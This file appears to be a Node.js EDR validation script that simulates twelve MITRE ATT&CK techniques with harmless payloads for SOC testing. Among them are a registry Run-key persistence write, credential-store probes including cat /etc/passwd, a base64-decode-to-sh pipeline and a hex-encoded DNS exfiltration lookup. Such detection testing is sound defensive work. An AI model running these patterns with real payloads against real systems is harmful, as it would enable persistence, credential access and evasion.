/*
EDR VALIDATION / SMOKE TEST (macOS, Windows, Linux)
=================================================
Purpose:
- Generate SAFE, NON-DESTRUCTIVE signals that a modern EDR (Bitdefender, Defender, CrowdStrike, etc.) should detect
- Supports: macOS, Windows, Linux (Ubuntu 20.04+)
- Produces structured, timestamped logs and a final execution summary

DISCLAIMERS:
- No exploits, no privilege escalation, no kernel or driver activity
- User-level actions only
- Intended for SOC validation, QA, demos, and EDR regression testing

Prerequisites:
- Node.js 18+
*/

const fs = require('fs');
const os = require('os');
const path = require('path');
const { exec, spawn } = require('child_process');
const https = require('https');

// Capture platform information to adapt test commands per OS
// Why: Different operating systems require different commands and paths for the same test scenarios
const PLATFORM = os.platform(); // darwin | win32 | linux

// Capture hostname for correlation in EDR logs
// Why: EDR systems log events with hostname, allowing SOC analysts to correlate test events across multiple machines
const HOST = os.hostname();

// Capture username for attribution in EDR logs
// Why: EDR systems track which user performed actions, important for security context and audit trails
const USER = os.userInfo().username;

// Use system temp directory for test files
// Why: Temp directories are safe locations that won't interfere with user data, and EDR systems monitor temp locations for suspicious activity
const TMP = os.tmpdir();

// Record start time to calculate total execution duration
// Why: Duration metrics help validate that EDR detection happens in reasonable timeframes and measure test suite performance
const START_TIME = Date.now();

// Store test results in memory before writing to report
// Why: Collecting all results first allows for summary statistics and structured reporting at the end
const results = [];

// Map each test to MITRE ATT&CK framework identifiers
// Why: MITRE ATT&CK provides standardized threat taxonomy that SOC teams use for threat hunting and EDR alert correlation
// This mapping allows analysts to search EDR logs using MITRE IDs and understand which attack techniques are being validated
const TEST_META = {
  'EICAR signature test': { id: 'T1204.002', tactic: 'Execution', technique: 'Malicious File' },
  'Process execution': { id: 'T1059', tactic: 'Execution', technique: 'Command and Scripting Interpreter' },
  'LOLBin usage': { id: 'T1218', tactic: 'Defense Evasion', technique: 'Signed Binary Proxy Execution' },
  'Persistence attempt': { id: 'T1547.001', tactic: 'Persistence', technique: 'Registry Run Keys / Startup Folder' },
  'Credential access attempt': { id: 'T1555', tactic: 'Credential Access', technique: 'Credentials from Password Stores' },
  'Outbound network connection': { id: 'T1071.001', tactic: 'Command and Control', technique: 'Web Protocols' },
  'Filesystem discovery': { id: 'T1083', tactic: 'Discovery', technique: 'File and Directory Discovery' },
  'Process tree behavior': { id: 'T1057', tactic: 'Discovery', technique: 'Process Discovery' },
  'Encoded command execution': { id: 'T1027', tactic: 'Defense Evasion', technique: 'Obfuscated/Encoded Commands' },
  'Ransomware-like behavior': { id: 'T1486', tactic: 'Impact', technique: 'Data Encrypted for Impact' },
  'DNS exfiltration pattern': { id: 'T1048', tactic: 'Exfiltration', technique: 'Exfiltration Over Alternative Protocol' },
  'File timestomping': { id: 'T1070.006', tactic: 'Defense Evasion', technique: 'Timestomp' }
};

/**
 * Get current timestamp in ISO 8601 format
 * Why: ISO format is standardized and easily parseable by EDR systems and log analysis tools
 * This ensures timestamps can be correlated with EDR event logs which typically use ISO format
 */
function now() {
  return new Date().toISOString();
}

/**
 * Record a test result with metadata for EDR correlation
 * Why: Each test result needs structured data including:
 * - MITRE ATT&CK mapping for threat hunting queries
 * - Correlation ID for linking test events to EDR alerts
 * - Timestamp for temporal analysis
 * - Status and details for debugging and validation
 * This structure enables SOC teams to search EDR logs and verify detection coverage
 */
function record(test, status, details = '') {
  const meta = TEST_META[test] || {};
  results.push({
    test,
    status,
    details,
    time: now(),
    mitre_id: meta.id || 'N/A',
    mitre_tactic: meta.tactic || 'N/A',
    mitre_technique: meta.technique || 'N/A',
    // Generate unique correlation ID combining timestamp and random string
    // Why: Allows SOC analysts to search EDR logs for this specific test run and correlate multiple events
    correlation_id: `EDR-TEST-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
  });
}

/**
 * Log a message with timestamp prefix
 * Why: Timestamps in logs help correlate console output with EDR event timestamps
 * This makes it easier to match test execution with EDR detections during analysis
 */
function log(msg) {
  console.log(`[${now()}] ${msg}`);
}

/**
 * Execute a shell command asynchronously and return result
 * Why: Node's exec() is callback-based, but we need Promise-based async/await syntax
 * This wrapper allows sequential test execution and proper error handling
 * We capture both stdout and stderr even on errors, as EDR systems may log both
 */
function execAsync(cmd) {
  return new Promise((resolve) => {
    exec(cmd, (err, stdout, stderr) => {
      resolve({ err, stdout, stderr });
    });
  });
}

/**
 * 1. EICAR TEST STRING
 * Expected EDR:
 * - Malware / Test Signature Detection
 * 
 * Why this test exists:
 * EICAR is a standardized test string recognized by all major antivirus/EDR systems as a test signature
 * It's designed to trigger signature-based detection without being actual malware
 * This validates that the EDR's signature detection engine is active and functioning
 * The EICAR string is intentionally crafted to match known malware patterns while being completely safe
 */
async function eicarTest() {
  log('Running EICAR test');
  try {
    // Standard EICAR test string - safe but triggers signature detection
    // Why: This exact string is recognized by EDR systems as a test pattern
    const eicar = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
    const file = path.join(TMP, 'eicar_test.txt');
    // Write to temp directory
    // Why: Temp directories are monitored by EDR systems, and using temp avoids cluttering user directories
    fs.writeFileSync(file, eicar);
    record('EICAR signature test', 'executed', file);
  } catch (e) {
    record('EICAR signature test', 'error', e.message);
  }
}

/**
 * 2. Script Interpreter & Process Execution
 * 
 * Why this test exists:
 * EDR systems monitor process execution, especially command interpreters (cmd, sh, bash, PowerShell)
 * Attackers use these interpreters to execute malicious commands, so EDRs must detect and log their usage
 * This test validates that the EDR is monitoring process creation and command execution
 * The 'whoami' command is safe but commonly used by attackers for reconnaissance
 */
async function processExecutionTest() {
  log('Testing process execution');
  try {
    // Use platform-specific command interpreter
    // Why: Windows uses cmd.exe, Unix-like systems use direct shell execution
    // EDR systems track which interpreter spawned which process, so we test both patterns
    if (PLATFORM === 'win32') {
      await execAsync('cmd.exe /c whoami');
    } else {
      await execAsync('whoami');
    }
    record('Process execution', 'executed', 'Shell command executed');
  } catch (e) {
    record('Process execution', 'error', e.message);
  }
}

/**
 * 3. LOLBins / Living-off-the-Land Binaries
 * 
 * Why this test exists:
 * LOLBins (Living-off-the-Land Binaries) are legitimate system tools that attackers abuse for malicious purposes
 * Examples: PowerShell, certutil, wmic on Windows; curl, wget, base64 on Linux/Mac
 * EDR systems must detect suspicious usage patterns of these tools, not just block them entirely
 * This test validates that EDRs monitor legitimate tool usage for abuse indicators
 * Using /usr/bin/env ensures we're using system binaries, not aliases or custom scripts
 */
async function lolbinTest() {
  log('Testing LOLBins');
  try {
    // Test platform-specific LOLBins
    // Why: Each OS has different legitimate tools that attackers commonly abuse
    // PowerShell on Windows, ls/ps on Unix systems - all legitimate but monitored by EDRs
    if (PLATFORM === 'win32') {
      await execAsync('powershell -Command "Get-Date"');
    } else if (PLATFORM === 'darwin') {
      // Use /usr/bin/env to ensure we're calling system binaries
      // Why: EDRs track which binaries are executed, and env helps locate the actual binary path
      await execAsync('/usr/bin/env ls');
    } else {
      await execAsync('/usr/bin/env ps');
    }
    record('LOLBin usage', 'executed', PLATFORM);
  } catch (e) {
    record('LOLBin usage', 'error', e.message);
  }
}

/**
 * 4. Persistence Attempt (User-Level)
 * 
 * Why this test exists:
 * Persistence mechanisms allow malware to survive reboots and maintain access to compromised systems
 * EDR systems must detect when programs attempt to establish persistence, even at user level
 * This test validates EDR detection of common persistence techniques without requiring admin privileges
 * We use user-level persistence locations because:
 * 1. They don't require elevated privileges (safer for testing)
 * 2. Many attacks use user-level persistence to avoid detection
 * 3. EDRs should detect both user and system-level persistence attempts
 */
async function persistenceTest() {
  log('Testing persistence mechanisms');
  try {
    if (PLATFORM === 'win32') {
      // Windows Registry Run key - common persistence location
      // Why: HKCU (HKEY_CURRENT_USER) Run key executes programs on user login
      // Attackers frequently use this for persistence, so EDRs monitor registry modifications here
      await execAsync(
        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v EDRTest /t REG_SZ /d "node.exe" /f'
      );
      record('Persistence attempt', 'executed', 'HKCU Run key');
    } else if (PLATFORM === 'darwin') {
      // macOS LaunchAgent - user-level launch daemon
      // Why: LaunchAgents run on user login and are a common macOS persistence mechanism
      // EDRs monitor LaunchAgent creation/modification as it's frequently abused by malware
      const agent = path.join(os.homedir(), 'Library/LaunchAgents/com.edr.test.plist');
      fs.writeFileSync(agent, '<plist></plist>');
      record('Persistence attempt', 'executed', 'LaunchAgent');
    } else {
      // Linux XDG autostart directory - desktop environment autostart
      // Why: XDG autostart is the standard Linux mechanism for user-level startup programs
      // EDRs should detect creation of autostart entries as they're used for persistence
      const autostart = path.join(os.homedir(), '.config/autostart');
      fs.mkdirSync(autostart, { recursive: true });
      fs.writeFileSync(path.join(autostart, 'edr-test.desktop'), '[Desktop Entry]');
      record('Persistence attempt', 'executed', 'XDG autostart');
    }
  } catch (e) {
    record('Persistence attempt', 'error', e.message);
  }
}

/**
 * 5. Credential Access (SAFE)
 * 
 * Why this test exists:
 * Credential access is a critical attack phase - attackers steal passwords, keys, and tokens
 * EDR systems must detect attempts to access credential stores, even if they fail
 * This test validates that EDRs monitor credential access attempts, not just successful theft
 * We use safe, read-only commands that won't expose real credentials but trigger EDR monitoring
 * The || true on macOS ensures the command doesn't fail if no password exists (expected behavior)
 */
async function credentialAccessTest() {
  log('Testing credential access');
  try {
    if (PLATFORM === 'win32') {
      // Windows Credential Manager listing
      // Why: cmdkey /list shows stored Windows credentials - attackers use this to enumerate credentials
      // EDRs monitor credential manager access as it's a common post-exploitation activity
      await execAsync('cmdkey /list');
    } else if (PLATFORM === 'darwin') {
      // macOS Keychain access attempt
      // Why: security command accesses the macOS Keychain - attackers target this for stored passwords
      // The || true ensures we don't fail if the test password doesn't exist (which is expected)
      await execAsync('security find-generic-password -a test || true');
    } else {
      // Linux /etc/passwd read (user account information)
      // Why: /etc/passwd contains user account info - attackers read this for reconnaissance
      // While it doesn't contain passwords (those are in /etc/shadow), reading it is still monitored
      await execAsync('cat /etc/passwd');
    }
    record('Credential access attempt', 'executed', PLATFORM);
  } catch (e) {
    record('Credential access attempt', 'error', e.message);
  }
}

/**
 * 6. Network Beacon / Outbound Connection
 * 
 * Why this test exists:
 * Malware communicates with command-and-control (C2) servers over the network
 * EDR systems monitor outbound network connections to detect C2 communication
 * This test validates that EDRs log network telemetry, even for legitimate domains
 * We use example.com (a safe, well-known domain) to avoid triggering false positives
 * HTTPS is used because modern malware often uses encrypted channels to evade detection
 */
async function networkTest() {
  log('Testing outbound network connection');
  return new Promise((resolve) => {
    // Use HTTPS to test encrypted connection monitoring
    // Why: Modern malware uses HTTPS/TLS to hide C2 traffic, so EDRs must monitor encrypted connections
    // example.com is a safe, reserved domain that won't trigger security alerts
    https.get('https://example.com', () => {
      record('Outbound network connection', 'executed', 'HTTPS example.com');
      resolve();
    }).on('error', (e) => {
      // Record error but don't fail the test
      // Why: Network errors are expected in some environments (firewalls, proxies)
      // The important part is that the connection attempt was made and logged by EDR
      record('Outbound network connection', 'error', e.message);
      resolve();
    });
  });
}

/**
 * 7. Reconnaissance / Discovery
 * 
 * Why this test exists:
 * Attackers perform reconnaissance to understand the target system before launching attacks
 * Filesystem discovery (listing directories) is a common reconnaissance technique
 * EDR systems should detect unusual access patterns to sensitive directories
 * We target system directories (C:\Windows, /etc) because:
 * 1. They contain sensitive system information
 * 2. Unusual access to these directories can indicate malicious activity
 * 3. EDRs monitor access to critical system paths
 */
async function discoveryTest() {
  log('Testing filesystem discovery');
  try {
    // Target platform-specific system directories
    // Why: System directories contain sensitive information that attackers seek
    // EDRs monitor access to these paths as part of discovery detection
    const target = PLATFORM === 'win32' ? 'C:\\Windows' : '/etc';
    // Use synchronous readdir to ensure immediate execution
    // Why: Synchronous operations are more likely to be logged immediately by EDR systems
    fs.readdirSync(target);
    record('Filesystem discovery', 'executed', target);
  } catch (e) {
    record('Filesystem discovery', 'error', e.message);
  }
}

/**
 * 8. Parent / Child Process Tree
 * 
 * Why this test exists:
 * Process tree analysis is critical for EDR detection - attackers often spawn child processes
 * EDRs correlate parent-child relationships to detect suspicious process chains
 * Example: A benign process spawning PowerShell, which spawns cmd.exe, which downloads malware
 * This test validates that EDRs track process parentage and can detect suspicious chains
 * We use spawn() instead of exec() to create a true child process relationship
 */
async function processTreeTest() {
  log('Testing process tree correlation');
  try {
    // Use spawn() to create a child process (not exec which waits for completion)
    // Why: spawn() creates a true parent-child relationship that EDRs can track
    // exec() waits for the command to finish, while spawn() creates an independent child process
    // This better simulates how attackers spawn processes during attacks
    if (PLATFORM === 'win32') {
      spawn('cmd.exe', ['/c', 'echo child']);
    } else {
      spawn('/bin/sh', ['-c', 'echo child']);
    }
    record('Process tree behavior', 'executed', 'Parent -> child');
  } catch (e) {
    record('Process tree behavior', 'error', e.message);
  }
}

/**
 * 9. Encoded Command Execution (T1027)
 * 
 * Why this test exists:
 * Attackers encode/obfuscate commands to evade signature-based detection and hide intent
 * Base64 encoding is a common obfuscation technique used to bypass simple string matching
 * EDR systems must detect encoded commands, either by:
 * 1. Detecting encoding/decoding operations
 * 2. Decoding and analyzing the underlying command
 * 3. Detecting suspicious patterns in encoded strings
 * This test validates that EDRs can detect and analyze encoded command execution
 */
async function encodedCommandTest() {
  log('Testing encoded command execution');
  try {
    if (PLATFORM === 'win32') {
      // PowerShell Base64 encoded command (Unicode base64 of "whoami")
      // Why: PowerShell's -EncodedCommand parameter is frequently abused by attackers
      // EDRs should detect when PowerShell executes base64-encoded commands
      await execAsync('powershell -EncodedCommand dwBoAG8AYQBtAGkA'); // base64 for "whoami"
    } else {
      // Unix pipeline: echo base64 -> decode -> execute
      // Why: Attackers use base64 encoding with pipes to hide command intent
      // EDRs should detect base64 decoding followed by shell execution
      await execAsync('echo "d2hvYW1p" | base64 -d | sh'); // base64 for "whoami"
    }
    record('Encoded command execution', 'executed', 'Base64 encoded command');
  } catch (e) {
    record('Encoded command execution', 'error', e.message);
  }
}

/**
 * 10. Ransomware-Like File Operations (T1486)
 * 
 * Why this test exists:
 * Ransomware encrypts files and renames them with new extensions (.encrypted, .locked, etc.)
 * EDR systems monitor file operations for patterns that indicate ransomware activity:
 * - Rapid file renames with suspicious extensions
 * - Mass file modifications
 * - Encryption-like file operations
 * This test simulates a ransomware pattern (create file, rename with .encrypted extension)
 * We only rename one file to be safe, but EDRs should detect the pattern
 */
async function suspiciousFileOpsTest() {
  log('Testing ransomware-like file patterns');
  try {
    // Create isolated test directory
    // Why: Isolating test files prevents accidental impact on user data
    const testDir = path.join(TMP, 'edr-ransom-test');
    fs.mkdirSync(testDir, { recursive: true });
    const original = path.join(testDir, 'document.txt');
    const encrypted = path.join(testDir, 'document.txt.encrypted');
    // Create file then rename with suspicious extension
    // Why: This pattern (create -> rename with .encrypted) mimics ransomware behavior
    // EDRs should detect rapid file renames with suspicious extensions
    fs.writeFileSync(original, 'Test content');
    fs.renameSync(original, encrypted);
    record('Ransomware-like behavior', 'executed', encrypted);
  } catch (e) {
    record('Ransomware-like behavior', 'error', e.message);
  }
}

/**
 * 11. DNS Exfiltration Pattern (T1048)
 * 
 * Why this test exists:
 * DNS exfiltration is a technique where attackers encode stolen data in DNS query subdomains
 * Example: "746573742d64617461.example.com" encodes "test-data" in hex
 * This bypasses many network security controls that don't inspect DNS traffic
 * EDR systems should detect:
 * 1. Unusually long subdomain names
 * 2. Hex-encoded or base64-encoded subdomains
 * 3. High volume of DNS queries to the same domain
 * This test validates that EDRs monitor DNS queries for exfiltration patterns
 */
async function dnsExfilTest() {
  log('Testing DNS exfiltration pattern');
  try {
    const dns = require('dns');
    // Create suspicious domain with hex-encoded data in subdomain
    // Why: This pattern (hex-encoded subdomain) is a common DNS exfiltration technique
    // EDRs should detect unusual subdomain patterns that suggest data exfiltration
    const suspiciousDomain = `${Buffer.from('test-data').toString('hex')}.example.com`;
    // Perform DNS lookup (non-blocking)
    // Why: DNS lookups are logged by EDRs, and the suspicious subdomain should trigger detection
    dns.lookup(suspiciousDomain, () => {});
    record('DNS exfiltration pattern', 'executed', suspiciousDomain);
  } catch (e) {
    record('DNS exfiltration pattern', 'error', e.message);
  }
}

/**
 * 12. File Timestomping (T1070.006)
 * 
 * Why this test exists:
 * Timestomping is an anti-forensics technique where attackers modify file timestamps
 * This makes files appear older or newer than they actually are, hiding evidence
 * Attackers use timestomping to:
 * 1. Make malicious files appear legitimate (old timestamps)
 * 2. Hide when files were actually created/modified
 * 3. Evade forensic timeline analysis
 * EDR systems should detect when file timestamps are modified, especially to suspicious dates
 * We set timestamps to 2020-01-01 (a date in the past) to simulate this behavior
 */
async function timestompTest() {
  log('Testing file timestomping behavior');
  try {
    const file = path.join(TMP, 'timestomp-test.txt');
    fs.writeFileSync(file, 'test');
    // Set file timestamps to a date in the past
    // Why: Modifying timestamps to past dates is a common timestomping technique
    // EDRs should detect timestamp modifications, especially when set to suspicious dates
    const oldDate = new Date('2020-01-01');
    // utimesSync modifies both access time (atime) and modification time (mtime)
    // Why: Attackers modify both timestamps to completely alter the file's temporal signature
    fs.utimesSync(file, oldDate, oldDate);
    record('File timestomping', 'executed', file);
  } catch (e) {
    record('File timestomping', 'error', e.message);
  }
}

/**
 * Generate a structured JSON report of all test results
 * 
 * Why this function exists:
 * SOC teams need structured reports to:
 * 1. Document which tests were executed
 * 2. Provide correlation IDs for searching EDR logs
 * 3. Generate summary statistics for validation reports
 * 4. Create search queries for EDR platforms (like Bitdefender)
 * 
 * The report structure includes:
 * - Metadata: Platform, hostname, user, timing information
 * - Test results: All individual test outcomes with MITRE mappings
 * - Summary: Statistics on executed vs failed tests
 * - EDR-specific sections: Pre-formatted search queries for common EDR platforms
 */
function generateReport() {
  const report = {
    meta: {
      tool: 'EDR Validation Suite',
      version: '1.1.0',
      platform: PLATFORM,
      hostname: HOST,
      user: USER,
      startTime: new Date(START_TIME).toISOString(),
      endTime: now(),
      // Calculate duration in milliseconds
      // Why: Duration helps measure test suite performance and EDR detection latency
      durationMs: Date.now() - START_TIME
    },
    tests: results,
    summary: {
      total: results.length,
      // Count successful executions
      // Why: Helps validate that tests ran successfully and weren't blocked
      executed: results.filter(r => r.status === 'executed').length,
      // Count errors
      // Why: Errors may indicate EDR blocking or system configuration issues
      errors: results.filter(r => r.status === 'error').length
    },
    // Bitdefender-specific section with search queries
    // Why: Different EDR platforms have different search syntaxes
    // This section provides ready-to-use queries for Bitdefender EDR searches
    // Other EDR platforms can be added similarly
    bitdefender: {
      expectedAlerts: results
        .filter(r => r.status === 'executed')
        .map(r => ({
          test: r.test,
          correlationId: r.correlation_id,
          mitreId: r.mitre_id,
          // Generate search query combining correlation ID and MITRE ID
          // Why: Allows SOC analysts to search EDR logs using either identifier
          // OR operator ensures matches on either the correlation ID or MITRE technique ID
          searchQuery: `"${r.correlation_id}" OR "${r.mitre_id}"`
        }))
    }
  };

  // Save report to temp directory with timestamp
  // Why: Timestamp in filename ensures unique reports for each test run
  // JSON format allows easy parsing by reporting tools and SIEM systems
  const reportPath = path.join(TMP, `edr-report-${Date.now()}.json`);
  fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
  log(`Report saved: ${reportPath}`);
  return reportPath;
}

/**
 * Main test execution function
 * 
 * Why this function exists:
 * Orchestrates all test execution in sequence, provides console output for real-time monitoring,
 * and generates final reports. Sequential execution ensures:
 * 1. Tests don't interfere with each other
 * 2. EDR events are easier to correlate (they happen in order)
 * 3. Errors in one test don't cascade to others
 * 4. Clear console output helps operators monitor progress
 * 
 * Test execution order:
 * Tests are ordered from basic (signature detection) to advanced (anti-forensics)
 * This progression helps validate that EDRs detect both simple and sophisticated techniques
 */
async function run() {
  log(`Starting EDR validation on ${PLATFORM} | Host=${HOST} | User=${USER}`);

  // Execute all tests sequentially
  // Why: Sequential execution ensures tests don't interfere and makes EDR event correlation easier
  await eicarTest();
  await processExecutionTest();
  await lolbinTest();
  await persistenceTest();
  await credentialAccessTest();
  await networkTest();
  await discoveryTest();
  await processTreeTest();
  await encodedCommandTest();
  await suspiciousFileOpsTest();
  await dnsExfilTest();
  await timestompTest();

  // Calculate and format duration
  // Why: Duration metrics help measure test suite performance and EDR detection latency
  const duration = ((Date.now() - START_TIME) / 1000).toFixed(2);

  // Print summary header
  // Why: Clear console output helps operators quickly see test results and key metadata
  log('--------------------------------------------------');
  log('EDR VALIDATION SUMMARY');
  log(`Platform   : ${PLATFORM}`);
  log(`Host       : ${HOST}`);
  log(`User       : ${USER}`);
  log(`Duration   : ${duration}s`);
  log('--------------------------------------------------');

  // Print each test result with correlation information
  // Why: Console output provides immediate feedback and includes correlation IDs for EDR log searches
  // Format: STATUS | TEST_NAME | DETAILS | MITRE_ID | CORRELATION_ID
  results.forEach(r => {
    log(
      `${r.status.toUpperCase()} | ${r.test} | ${r.details} | MITRE=${r.mitre_id} | CID=${r.correlation_id}`
    );
  });

  // Print expected coverage list
  // Why: Reminds operators what attack techniques should be detected by the EDR
  // This helps validate that EDR coverage matches expected capabilities
  log('--------------------------------------------------');
  log('Expected EDR Coverage:');
  log('- Malware signature detection (EICAR)');
  log('- Script interpreter & process execution');
  log('- LOLBin / dual-use binary usage');
  log('- Persistence mechanisms (user-level)');
  log('- Credential access attempts');
  log('- Outbound network telemetry');
  log('- Discovery & reconnaissance');
  log('- Parent/child process correlation');
  log('- Encoded/obfuscated command execution');
  log('- Ransomware-like file encryption patterns');
  log('- DNS-based exfiltration patterns');
  log('- Timestomping / anti-forensics');
  log('EDR validation completed');

  // Generate and save structured report
  // Why: JSON report provides machine-readable output for automation and detailed analysis
  generateReport();

  // Exit with appropriate code based on test results
  // Why: Exit codes allow scripts and CI/CD systems to determine if tests passed or failed
  // Exit 0 = success (all tests executed), non-zero = errors occurred
  const errorCount = results.filter(r => r.status === 'error').length;
  if (errorCount > 0) {
    log(`Exiting with error code 1 (${errorCount} test(s) failed)`);
    process.exit(1);
  } else {
    log('Exiting with success code 0 (all tests executed successfully)');
    process.exit(0);
  }
}

run();
